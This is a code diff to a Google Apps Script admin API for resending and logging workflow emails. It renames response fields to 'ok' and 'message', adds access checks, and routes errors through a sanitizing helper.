@@ -4965,7 +4979,7 @@ function apiPhase3_NotifyISMember_(sessionId, stepNumber) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// ADMIN EMAIL FAILOVER API — called by Admin Panel via google.script.run
+// ADMIN EMAIL FAILOVER API: called by Admin Panel via google.script.run
 // ═══════════════════════════════════════════════════════════════════════════════
 
 /*
@@ -4975,9 +4989,9 @@ function apiPhase3_NotifyISMember_(sessionId, stepNumber) {
   TECHNICAL: Reads Risk_Audit, keeps rows whose Action starts with 'Email ' (or equals
              'Email Resend') AND whose SessionID matches, parses InternalFlags into
              {recipient,type,attempts,error}, and sorts by timestamp ascending.
-  PARAMS:    - sessionId — required.
-  RETURNS:   {success:true, data:[{logId,action,flags,timestamp}...]}
-             or {success:false, error}.
+  PARAMS:    - sessionId: required.
+  RETURNS:   {ok: true, data:[{logId,action,flags,timestamp}...]}
+             or {ok: false, message}.
 */
 function adminGetEmailLog(sessionId) {
   // SECURITY: reachable from any domain account via google.script.run regardless of the page
@@ -4985,17 +4999,17 @@ function adminGetEmailLog(sessionId) {
   // apiAdmin_* families and missed this one.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     if (!sessionId || String(sessionId).trim() === '') {
-      return { ok: false, success: false, error: 'Session ID is required.' };
+      return { ok: false, message: 'Session ID is required.' };
     }
     sessionId = String(sessionId).trim();
 
     var ss = getSpreadsheet_();
     var auditSheet = ss.getSheetByName(SHEET_NAMES.RISK_AUDIT);
     if (!auditSheet) {
-      return { ok: false, success: false, error: 'Risk_Audit sheet not found.' };
+      return { ok: false, message: 'Risk_Audit sheet not found.' };
     }
 
     var rows = sheetToObjects_(auditSheet);
@@ -5035,10 +5049,10 @@ function adminGetEmailLog(sessionId) {
     // Sort by timestamp ascending
     results.sort(function(a, b) { return a.timestamp.localeCompare(b.timestamp); });
 
-    return { ok: true, success: true, data: results };
+    return { ok: true, data: results };
   } catch (e) {
     Logger.log('[ADMIN] adminGetEmailLog error: ' + e.toString());
-    return { ok: false, success: false, error: 'adminGetEmailLog: ' + e.toString() };
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
@@ -5049,8 +5063,8 @@ function adminGetEmailLog(sessionId) {
   TECHNICAL: Reads Risk_Audit, keeps rows with Action exactly 'Email Failed' whose
              timestamp is within sinceDays (default 7), maps InternalFlags fields, and
              sorts by timestamp descending.
-  PARAMS:    - sinceDays — lookback window in days (default 7; invalid -> 7).
-  RETURNS:   {success:true, data:[...], sinceDays} or {success:false, error}.
+  PARAMS:    - sinceDays: lookback window in days (default 7; invalid -> 7).
+  RETURNS:   {ok: true, data:[...], sinceDays} or {ok: false, message}.
 */
 function adminGetFailedEmails(sinceDays) {
   // SECURITY: reachable from any domain account via google.script.run regardless of the page
@@ -5058,7 +5072,7 @@ function adminGetFailedEmails(sinceDays) {
   // apiAdmin_* families and missed this one.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     if (sinceDays === undefined || sinceDays === null) sinceDays = 7;
     sinceDays = Number(sinceDays);
@@ -5067,7 +5081,7 @@ function adminGetFailedEmails(sinceDays) {
     var ss = getSpreadsheet_();
     var auditSheet = ss.getSheetByName(SHEET_NAMES.RISK_AUDIT);
     if (!auditSheet) {
-      return { ok: false, success: false, error: 'Risk_Audit sheet not found.' };
+      return { ok: false, message: 'Risk_Audit sheet not found.' };
     }
 
     var rows = sheetToObjects_(auditSheet);
@@ -5105,10 +5119,10 @@ function adminGetFailedEmails(sinceDays) {
     // Sort by timestamp descending (most recent first)
     results.sort(function(a, b) { return b.timestamp.localeCompare(a.timestamp); });
 
-    return { ok: true, success: true, data: results, sinceDays: sinceDays };
+    return { ok: true, data: results, sinceDays: sinceDays };
   } catch (e) {
     Logger.log('[ADMIN] adminGetFailedEmails error: ' + e.toString());
-    return { ok: false, success: false, error: 'adminGetFailedEmails: ' + e.toString() };
+    return safeError_(e, ERR.INTERNAL);
   }
 }
 
@@ -5122,37 +5136,37 @@ function adminGetFailedEmails(sinceDays) {
              workflow sheet and calls notifyApprover_ / apiPhase3_NotifyISMember_; for
              'applicant' it calls notifyApplicant_ with the current status. Logs an
              'Email Resend' audit row regardless of outcome.
-  PARAMS:    - sessionId — required.
-             - recipient — intended email address.
-             - type — 'approver' | 'applicant' | 'ism'.
+  PARAMS:    - sessionId: required.
+             - recipient: intended email address.
+             - type: 'approver' | 'applicant' | 'ism'.
   RETURNS:   {success, error, message}.
 
   STEPS
-    Step 1 — Validate sessionId, type, and application existence.
-    Step 2 — Resolve the recipient's pending step (approver/ism) and notify.
-    Step 3 — Log the resend; return the outcome.
+    Step 1: Validate sessionId, type, and application existence.
+    Step 2: Resolve the recipient's pending step (approver/ism) and notify.
+    Step 3: Log the resend; return the outcome.
 */
 function adminResendEmail(sessionId, recipient, type) {
-  // SECURITY: re-authorize the caller — re-sends workflow emails; require INFOSEC.
+  // SECURITY: re-authorize the caller, re-sends workflow emails; require INFOSEC.
   var _me = Session.getActiveUser().getEmail();
   var _authz = checkAccess_(_me);
-  if (!_authz.allowed) return { ok: false, success: false, error: _authz.reason };
+  if (!_authz.allowed) return { ok: false, message: _authz.reason };
   try {
     if (!sessionId || String(sessionId).trim() === '') {
-      return { ok: false, success: false, error: 'Session ID is required.', message: '' };
+      return { ok: false, message: 'Session ID is required.'};
     }
     sessionId = String(sessionId).trim();
 
     var validTypes = ['approver', 'applicant', 'ism'];
     var normalizedType = String(type || '').trim().toLowerCase();
     if (validTypes.indexOf(normalizedType) === -1) {
-      return { ok: false, success: false, error: 'Invalid type "' + type + '". Must be approver, applicant, or ism.', message: '' };
+      return { ok: false, message: 'Invalid type "' + type + '". Must be approver, applicant, or ism.'};
     }
 
     // Validate application exists
     var app = getApplicationData_(sessionId);
     if (!app) {
-      return { ok: false, success: false, error: 'Application not found for Session ID: ' + sessionId, message: '' };
+      return { ok: false, message: 'Application not found for Session ID: ' + sessionId};
     }
 
     var result;
@@ -5161,7 +5175,7 @@ function adminResendEmail(sessionId, recipient, type) {
       case 'approver':
         var ss = getSpreadsheet_();
         var awSheet = ss.getSheetByName(SHEET_NAMES.APPROVAL_WORKFLOW);
-        if (!awSheet) return { ok: false, success: false, error: 'Approval_Workflow sheet not found.', message: '' };
+        if (!awSheet) return { ok: false, message: 'Approval_Workflow sheet not found.'};
 
         var awRows = sheetToObjectsFiltered_(awSheet, 'SessionID', sessionId);
 
@@ -5179,10 +5193,8 @@ function adminResendEmail(sessionId, recipient, type) {
 
         if (targetStepIndex === -1) {
           return {
-            ok: false, success: false,
-            error: 'No pending approval step found for recipient ' + recipient,
-            message: ''
-          };
+            ok: false,
+            message: 'No pending approval step found for recipient ' + recipient};
         }
 
         result = notifyApprover_(sessionId, targetStepIndex);
@@ -5195,7 +5207,7 @@ function adminResendEmail(sessionId, recipient, type) {
       case 'ism':
         var ismSs = getSpreadsheet_();
         var ismSheet = ismSs.getSheetByName(SHEET_NAMES.ISM_APPROVAL);
-        if (!ismSheet) return { ok: false, success: false, error: 'ISM_Approval_Workflow sheet not found.', message: '' };
+        if (!ismSheet) return { ok: false, message: 'ISM_Approval_Workflow sheet not found.'};
 
         var ismRows = sheetToObjectsFiltered_(ismSheet, 'SessionID', sessionId);
 
@@ -5213,17 +5225,15 @@ function adminResendEmail(sessionId, recipient, type) {
 
         if (targetStepNum === -1) {
           return {
-            ok: false, success: false,
-            error: 'No pending ISM step found for recipient ' + recipient,
-            message: ''
-          };
+            ok: false,
+            message: 'No pending ISM step found for recipient ' + recipient};
         }
 
         result = apiPhase3_NotifyISMember_(sessionId, targetStepNum);
         break;
 
       default:
-        return { ok: false, success: false, error: 'Unhandled type: ' + normalizedType, message: '' };
+        return { ok: false, message: 'Unhandled type: ' + normalizedType};
     }
 
     // Log the resend action
@@ -5231,14 +5241,14 @@ function adminResendEmail(sessionId, recipient, type) {
       recipient: recipient,
       type: normalizedType,
       attempts: 1,
-      error: result && result.success ? null : (result ? result.error : 'Unknown error')
+      error: result && result.ok ? null : (result ? result.message : 'Unknown error')
     };
     logAuditTrail_(sessionId, 'Email Resend', resendFlags);
 
-    if (result && result.success) {
-      return { ok: true, success: true, error: null, message: 'Email resent successfully to ' + recipient };
+    if (result && result.ok) {
+      return { ok: true, message: 'Email resent successfully to ' + recipient };
     } else {
-      return { ok: false, success: false, error: result ? result.error : 'Failed to send email', message: '' };
+      return { ok: false, message: result ? result.message : 'Failed to send email'};
     }
   } catch (e) {
     Logger.log('[ADMIN] adminResendEmail error: ' + e.toString());
@@ -5255,13 +5265,13 @@ function adminResendEmail(sessionId, recipient, type) {
 */
 function checkProperties() {
   // SECURITY: editor-run helper; cannot take a trailing underscore, so gate on owner context.
-  if (!isOwnerContext_()) return { ok: false, success: false, error: 'Not authorized.' };
+  if (!isOwnerContext_()) return { ok: false, message: 'Not authorized.' };
   var key = PropertiesService.getScriptProperties().getProperty('ADMIN_API_KEY');
   Logger.log('ADMIN_API_KEY: ' + (key ? '✅ SET (' + key.substring(0, 6) + '...)' : '❌ MISSING'));
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// ADMIN API — Self-Test (run from Apps Script editor to verify all endpoints)
+// ADMIN API: Self-Test (run from Apps Script editor to verify all endpoints)
 // ═══════════════════════════════════════════════════════════════════════════════
 
 /*
@@ -5279,7 +5289,7 @@ function checkProperties() {
 */
 function testAdminApi() {
   // SECURITY: editor-run helper; cannot take a trailing underscore, so gate on owner context.
-  if (!isOwnerContext_()) return { ok: false, success: false, error: 'Not authorized.' };
+  if (!isOwnerContext_()) return { ok: false, message: 'Not authorized.' };
   Logger.log('═══════════════════════════════════════════');
   Logger.log('ADMIN API SELF-TEST');
   Logger.log('═══════════════════════════════════════════');
@@ -5288,7 +5298,7 @@ function testAdminApi() {
 
   function assert_(name, cond, detail) {
     if (cond) { passed++; results.push('✅ ' + name); }
-    else { failed++; results.push('❌ ' + name + (detail ? ' — ' + detail : '')); }
+    else { failed++; results.push('❌ ' + name + (detail ? ': ' + detail : '')); }
   }
 
   try {
@@ -5323,23 +5333,23 @@ function testAdminApi() {
     // ── 4. Auth check ──
     Logger.log('\n── 4. API Auth ──');
     var fakeResp1 = handleAdminApi_({ apiKey: 'bad-key', action: 'getQueueSummary', params: {} });
-    assert_('Rejects bad API key', fakeResp1 && !fakeResp1.success && fakeResp1.error.indexOf('Unauthorized') === 0, fakeResp1.error);
+    assert_('Rejects bad API key', fakeResp1 && !fakeResp1.ok && fakeResp1.message.indexOf('Unauthorized') === 0, fakeResp1.message);
     if (key) {
       var fakeResp2 = handleAdminApi_({ apiKey: key, action: 'getQueueSummary', params: {} });
-      assert_('Accepts valid API key', fakeResp2 && fakeResp2.success === true, fakeResp2.error);
+      assert_('Accepts valid API key', fakeResp2 && fakeResp2.ok === true, fakeResp2.message);
     }
 
     // ── 5. Unknown action ──
     Logger.log('\n── 5. Unknown Action ──');
     var unkResp = handleAdminApi_({ apiKey: key || 'test', action: 'nonexistentAction', params: {} });
-    assert_('Rejects unknown action', unkResp && !unkResp.success && unkResp.error.indexOf('Unknown') !== -1, unkResp.error);
+    assert_('Rejects unknown action', unkResp && !unkResp.ok && unkResp.message.indexOf('Unknown') !== -1, unkResp.message);
 
     // ── 6. getQueueSummary ──
     Logger.log('\n── 6. getQueueSummary ──');
     if (key) {
       var qsResult = adminApi_getQueueSummary({});
-      assert_('getQueueSummary succeeds', qsResult && qsResult.success, qsResult.error);
-      if (qsResult && qsResult.success && qsResult.data) {
+      assert_('getQueueSummary succeeds', qsResult && qsResult.ok, qsResult.message);
+      if (qsResult && qsResult.ok && qsResult.data) {
         var d = qsResult.data;
         assert_('Has totalPending', d.totalPending !== undefined);
         assert_('Has totalFailed', d.totalFailed !== undefined);
@@ -5353,8 +5363,8 @@ function testAdminApi() {
     Logger.log('\n── 7. getEmailQueue ──');
     if (key) {
       var eqResult = adminApi_getEmailQueue({ limit: 5 });
-      assert_('getEmailQueue succeeds', eqResult && eqResult.success, eqResult.error);
-      if (eqResult && eqResult.success) {
+      assert_('getEmailQueue succeeds', eqResult && eqResult.ok, eqResult.message);
+      if (eqResult && eqResult.ok) {
         assert_('Returns data array', Array.isArray(eqResult.data));
         assert_('Respects limit (≤5)', eqResult.data.length <= 5, 'Returned: ' + eqResult.data.length);
       }
@@ -5366,7 +5376,7 @@ function testAdminApi() {
     Logger.log('\n── 8. getEmailLog ──');
     if (key) {
       var elResult = adminApi_getEmailLog_('PIA-000222');
-      assert_('getEmailLog returns (may be empty)', elResult && elResult.success === true, elResult.error);
+      assert_('getEmailLog returns (may be empty)', elResult && elResult.ok === true, elResult.message);
     } else {
       results.push('⚠️  Skipped (no API key)');
     }
@@ -5375,7 +5385,7 @@ function testAdminApi() {
     Logger.log('\n── 9. getFailedEmails ──');
     if (key) {
       var feResult = adminApi_getFailedEmails_(30);
-      assert_('getFailedEmails succeeds', feResult && feResult.success, feResult.error);
+      assert_('getFailedEmails succeeds', feResult && feResult.ok, feResult.message);
     } else {
       results.push('⚠️  Skipped (no API key)');
     }
@@ -5384,7 +5394,7 @@ function testAdminApi() {
     Logger.log('\n── 10. getNotificationConfig ──');
     if (key) {
       var ncResult = adminApi_getNotificationConfig();
-      assert_('getNotificationConfig succeeds', ncResult && ncResult.success, ncResult.error);
+      assert_('getNotificationConfig succeeds', ncResult && ncResult.ok, ncResult.message);
     } else {
       results.push('⚠️  Skipped (no API key)');
     }
@@ -5393,7 +5403,7 @@ function testAdminApi() {
     Logger.log('\n── 12. getPipelineView ──');
     if (key) {
       var pvResult = adminApi_getPipelineView('PIA-000222');
-      assert_('getPipelineView returns (may be not-found)', pvResult && (pvResult.success || pvResult.error), pvResult.error);
+      assert_('getPipelineView returns (may be not-found)', pvResult && (pvResult.ok || pvResult.message), pvResult.message);
     } else {
       results.push('⚠️  Skipped (no API key)');
     }
@@ -5402,7 +5412,7 @@ function testAdminApi() {
     Logger.log('\n── 13. retryQueuedEmail ──');
     if (key) {
       var rqResult = adminApi_retryQueuedEmail('nonexistent-id');
-      assert_('retryQueuedEmail handles not-found gracefully', rqResult && !rqResult.success, rqResult.error);
+      assert_('retryQueuedEmail handles not-found gracefully', rqResult && !rqResult.ok, rqResult.message);
     } else {
       results.push('⚠️  Skipped (no API key)');
     }
@@ -5411,9 +5421,9 @@ function testAdminApi() {
     Logger.log('\n── 14. resendToStage ──');
     if (key) {
       var rsResult1 = adminApi_resendToStage_('', 'invalid', '');
-      assert_('Rejects empty sessionId', rsResult1 && !rsResult1.success);
+      assert_('Rejects empty sessionId', rsResult1 && !rsResult1.ok);
       var rsResult2 = adminApi_resendToStage_('fake-session', 'invalid', '');
-      assert_('Rejects invalid stageType', rsResult2 && !rsResult2.success && rsResult2.error.indexOf('Invalid stage') !== -1, rsResult2.error);
+      assert_('Rejects invalid stageType', rsResult2 && !rsResult2.ok && rsResult2.message.indexOf('Invalid stage') !== -1, rsResult2.message);
     } else {
       results.push('⚠️  Skipped (no API key)');
     }
